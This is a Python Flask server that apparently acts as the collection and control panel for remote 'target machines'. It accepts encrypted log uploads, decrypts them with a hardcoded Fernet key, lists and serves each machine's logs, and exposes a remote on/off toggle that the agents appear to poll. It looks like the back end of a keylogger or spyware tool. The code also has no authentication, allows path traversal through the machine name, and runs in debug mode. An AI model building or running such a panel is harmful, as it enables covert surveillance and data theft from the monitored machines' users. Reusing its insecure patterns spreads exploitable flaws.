from flask import Flask, render_template, request, jsonify
import os
import time
import json
from cryptography.fernet import Fernet


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # project/
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")

app = Flask(__name__, static_folder=FRONTEND_DIR, template_folder=FRONTEND_DIR)
key = b'9YxKn3m3G5qXz2o9xYxKn3m3G5qXz2o9xYxKn3m3G5q='
fernet = Fernet(key)

DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
DECRYPTED_FOLDER = os.path.join(os.path.dirname(__file__), "decrypted_data")
data_list = []
# In-memory desired toggle state per machine
DESIRED_TOGGLE = {}


@app.route("/")
def home():
    return render_template("WebsiteView.html")

@app.route("/individualUinit.html")
def individual_unit():
    machine_name = request.args.get("machine_name")
    return render_template("individualUinit.html", machine_name=machine_name)


@app.route("/api/getTargetMachinesList", methods=["GET"])
def get_target_machines_list():
    all_machines = os.listdir(DECRYPTED_FOLDER)
    return jsonify(all_machines), 200


@app.route("/api/getData/<machine>", methods=["GET"])
def get_data(machine):
    machine_path = os.path.join(DECRYPTED_FOLDER, machine)
    if not os.path.exists(machine_path):
        return jsonify({"error": "Machine not found"}), 404
        
    data_objects = {}
    for file_name in os.listdir(machine_path):
        file_path = os.path.join(machine_path, file_name)
        with open(file_path, "r") as file:
            try:
                data_objects[f"{file_name.strip('.json')}"] = json.load(file) # actual JSON object
            except json.JSONDecodeError:
                data_objects[f"{file_name.strip('.json')}"] = {"error": f"{file_name} is not valid JSON"}
    return jsonify(data_objects), 200


@app.route("/api/upload", methods=["POST"])
def upload_api():
    data = request.get_data()
    if not data:
        return jsonify({"error": "Invalid payload"}), 400

    machine_name = request.headers.get("X-Machine-Name", "unknown")
    machine_path = os.path.join(DATA_FOLDER, machine_name)
    decrypted_machine_path = os.path.join(DECRYPTED_FOLDER, machine_name)
    os.makedirs(machine_path, exist_ok=True)
    os.makedirs(decrypted_machine_path, exist_ok=True)

    file_name = f"log_{time.strftime('%Y-%m-%d_%H-%M-%S')}.enc"
    file_path = os.path.join(machine_path, file_name)

    with open(file_path, "wb") as f:
        f.write(data)

    try:
        decrypted_data = fernet.decrypt(data)
        decrypted_json = json.loads(decrypted_data)
        data_list.append(decrypted_json)

        decrypted_file_name = f"log_{time.strftime('%Y-%m-%d_%H-%M-%S')}.json"
        decrypted_file_path = os.path.join(decrypted_machine_path, decrypted_file_name)
        with open(decrypted_file_path, "w", encoding="utf-8") as f:
            json.dump(decrypted_json, f, indent=2, ensure_ascii=False)
        
        # Acknowledge successful upload
        return jsonify({"status": "ok"}), 200
    except Exception:
        return jsonify({"error": "Decryption failed"}), 400


@app.route("/api/toggle", methods=["GET", "POST"])
def toggle_api():
    # POST sets the desired state; GET retrieves it
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        machine = data.get("machine") or request.args.get("machine") or "unknown"
        status = bool(data.get("status"))
        DESIRED_TOGGLE[machine] = status
        print({"machine": machine, "status": status})
        return jsonify({"machine": machine, "status": status}), 200

    machine = request.args.get("machine") or "unknown"
    status = DESIRED_TOGGLE.get(machine, True)
    return jsonify({"machine": machine, "status": status}), 200

@app.route("/api/deleteLogs/<machine>", methods=["DELETE"])
def delete_logs(machine):
    machine_path = os.path.join(DECRYPTED_FOLDER, machine)
    if not os.path.exists(machine_path):
        return jsonify({"error": "Machine not found"}), 404

    # Delete all log files for the specified machine
    for file_name in os.listdir(machine_path):
        file_path = os.path.join(machine_path, file_name)
        os.remove(file_path)
    
    machine_path = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_path):
        return jsonify({"error": "Machine not found"}), 404

    # Delete all log files for the specified machine
    for file_name in os.listdir(machine_path):
        file_path = os.path.join(machine_path, file_name)
        os.remove(file_path)

    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    app.run(debug=True) 
